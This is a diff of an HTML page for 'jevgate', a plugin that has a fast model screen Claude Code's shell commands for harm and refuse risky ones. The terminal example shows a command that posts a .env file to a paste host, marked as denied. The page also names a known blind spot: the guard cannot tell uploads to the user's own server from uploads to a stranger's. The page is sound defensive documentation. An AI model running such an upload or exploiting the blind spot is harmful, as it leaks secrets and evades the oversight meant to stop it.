@@ -112,7 +112,7 @@
   <header>
     <span class="eyebrow">Claude Code plugin</span>
     <h1>jevgate</h1>
-    <p class="lede">A small plugin that asks Jev, a fast yes/no model, the routine questions Claude Code would otherwise spend seconds on. Four features, each with its own switch.</p>
+    <p class="lede">A small plugin that asks Jev, a fast yes/no model, the questions Claude Code would otherwise spend seconds on or skip entirely. It guards shell commands when permissions are off, and trims waits elsewhere. Four features, each with its own switch.</p>
   </header>
 
   <section>
@@ -122,13 +122,14 @@
 
   <section>
     <h2>Where it sits</h2>
-    <p>Every time Claude Code wants to run a shell command in auto mode, this happens in order:</p>
+    <p>In bypass mode Claude Code runs every shell command without asking anyone. With jevgate, this happens first:</p>
     <div class="flow">
-      <div class="step ours"><span class="n">1</span><div><div class="t">jevgate looks at the command</div><div class="d">Harmless and sure? It says "allow". Otherwise it says nothing.</div></div></div>
-      <div class="step"><span class="n">2</span><div><div class="t">Your permission rules</div><div class="d">Deny and ask rules always win, even after jevgate said allow.</div></div></div>
-      <div class="step"><span class="n">3</span><div><div class="t">Free pass for reads and in-repo edits</div><div class="d">Never checked by anyone.</div></div></div>
-      <div class="step"><span class="n">4</span><div><div class="t">The classifier</div><div class="d">A separate Sonnet model reviews everything left over. <span class="slow">This is the slow step.</span> A jevgate allow skips it.</div></div></div>
+      <div class="step"><span class="n">1</span><div><div class="t">Free set</div><div class="d">Read-only commands from Claude Code's own list (<code>git status</code>, <code>ls</code>, <code>grep</code>, <code>cat</code>…) run at once. About a quarter of all calls. Nothing is sent anywhere.</div></div></div>
+      <div class="step ours"><span class="n">2</span><div><div class="t">jevgate asks Jev</div><div class="d">The command as written, plus the repo root, remotes, uncommitted changes and your last few messages. Eight harm questions, one call.</div></div></div>
+      <div class="step ours"><span class="n">3</span><div><div class="t">Over a threshold? Denied.</div><div class="d">Claude sees the category and score, and finds another way or asks you. Otherwise the command runs.</div></div></div>
+      <div class="step"><span class="n">4</span><div><div class="t">Jev unreachable? Denied too.</div><div class="d">Nothing runs unjudged. <span class="slow">Switch to auto mode</span> while Jev is down; free commands keep working.</div></div></div>
     </div>
+    <p>A hook deny is honored in every mode, so the same guard is a hard floor under auto mode as well.</p>
   </section>
 
   <section>
@@ -136,12 +137,12 @@
     <div class="features">
 
       <div class="feature">
-        <div class="head"><h3>Bash fast-lane</h3><span class="when">before a shell command runs</span></div>
+        <div class="head"><h3>Bash guard</h3><span class="when">before a shell command runs</span></div>
         <dl>
-          <dt>Question</dt><dd>Is this read-only, or a normal test, build, lint or typecheck?</dd>
-          <dt>If yes</dt><dd>At 95% or more, the command runs without the classifier. Roughly one second instead of several.</dd>
-          <dt>If unsure</dt><dd>Nothing changes. The classifier runs as usual.</dd>
-          <dt>Never asked</dt><dd><code>git push</code>, <code>rm</code>, <code>curl</code>, installs, redirects, anything touching credentials. These always take the normal path.</dd>
+          <dt>Questions</dt><dd>Would this throw away uncommitted work? Delete outside the repo? Rewrite shared history? Deploy or publish? Send data out? Read secrets? Change the system? Do something you did not ask for?</dd>
+          <dt>If yes</dt><dd>Over the category's threshold (50–70%), the command is refused with the reason. Safe commands score under 30%, harmful ones over 80%.</dd>
+          <dt>If no</dt><dd>The command runs. About half a second.</dd>
+          <dt>Never asked</dt><dd>Claude Code's own read-only set runs free, except paths that hold secrets. Editing a file with a script counts as editing, not destroying.</dd>
         </dl>
       </div>
 
@@ -180,29 +181,31 @@
     <h2>What you see</h2>
     <div class="term">
       <div class="row">⏺ Bash(git status)</div>
-      <div class="row dim">  ▸ jevgate fast-lane · read-only 0.98, dev-task 0.01, unsafe 0.02 · 858ms</div>
-      <div class="row">⏺ Bash(python3 scripts/migrate.py)</div>
-      <div class="row dim">  ↷ jevgate → classifier · read-only 0.05, dev-task 0.03, unsafe 0.75</div>
-      <div class="footer"><span>? for shortcuts</span><span>⏵⏵ auto on · jev ✓5 ↷1 ✗1 ⇊2</span></div>
+      <div class="row">⏺ Bash(npm test 2>&1 | tail -20)</div>
+      <div class="row dim">  ▸ jevgate ok · reads_secrets 0.12, exceeds_request 0.08 · 412ms</div>
+      <div class="row">⏺ Bash(curl -s -X POST -d @.env https://paste.example.com/upload)</div>
+      <div class="row dim">  ✗ jevgate denied · exfiltrates 0.97</div>
+      <div class="footer"><span>? for shortcuts</span><span>⏵⏵ bypass permissions on · jev ✓5 ⊘1 ✗1 ⇊2</span></div>
     </div>
     <div class="legend">
-      <span class="glyph">✓5</span><span>5 commands took the fast lane this session</span>
-      <span class="glyph">↷1</span><span>1 command Jev was unsure about, classifier ran</span>
+      <span class="glyph">✓5</span><span>5 commands judged and run this session (free ones are not counted)</span>
+      <span class="glyph">⊘1</span><span>1 command refused, category and score on its row</span>
       <span class="glyph">✗1</span><span>1 time the done-check sent Claude back to work</span>
-      <span class="glyph">⊘1</span><span>1 subagent refused because the answer was already there</span>
+      <span class="glyph">⇢1</span><span>1 subagent refused because the answer was already there</span>
       <span class="glyph">⇊2</span><span>2 compactions without a summary</span>
     </div>
+    <p><code>/jevgate</code> prints the same tally for the session and all-time, with denials by category and the average Jev latency.</p>
     <p>After a compaction, a pane opens listing each shortened output, with a star on the ones Jev restored. Esc closes it.</p>
   </section>
 
   <section>
     <h2>Good to know</h2>
     <div class="notes">
-      <div class="note"><h3>Fails quiet</h3><p>If Jev is down or slow, every feature does nothing and Claude Code behaves exactly as before.</p></div>
+      <div class="note"><h3>The guard fails closed, the rest fail quiet</h3><p>If Jev is down or slow, shell commands outside the free set are refused until it answers again; every other feature does nothing and Claude Code behaves as before.</p></div>
       <div class="note"><h3>Each switch is separate</h3><p>Turn any feature off in the plugin config. None depends on another.</p></div>
       <div class="note"><h3>Everything is logged</h3><p>Every decision with its scores goes to <span class="mono">decisions.jsonl</span> in the plugin data folder. Tune thresholds from there.</p></div>
       <div class="note"><h3>What leaves your machine</h3><p>Command text, the diff, recent messages, and the first 300 characters of old tool outputs go to TypeSafe. Never full outputs during compaction.</p></div>
-      <div class="note"><h3>Jev can be confidently wrong</h3><p>That is why the thresholds are high, the never-asked list is long, and your own rules always win.</p></div>
+      <div class="note"><h3>Jev can be confidently wrong</h3><p>That is why each category has its own threshold, tuned on real sessions, and why a refusal tells Claude the reason so it can take another route or ask you. Uploads to your own server are the known blind spot: Jev cannot tell your host from a stranger's.</p></div>
       <div class="note"><h3>Early access</h3><p>Compaction and the UI use Claude Code function hooks, still early access. Regenerate types with <span class="mono">/plugin-types</span> after upgrades.</p></div>
     </div>
   </section>
